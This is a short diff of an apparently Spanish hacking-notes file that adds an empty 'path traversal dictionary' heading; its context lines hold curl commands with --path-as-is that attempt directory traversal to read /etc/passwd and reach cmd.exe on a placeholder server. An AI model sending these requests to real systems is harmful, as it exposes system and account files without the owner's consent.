@@ -16,6 +16,10 @@ curl --path-as-is -k -v http://ip:80/../../../../../etc/passwd
 
 curl --path-as-is -k -v http://ip:80/../../../../../../windows/system32/cmd.exe
 
+## diccionario path traversal 
+
+
+
 
 
 ## http://www.hackingyseguridad.com
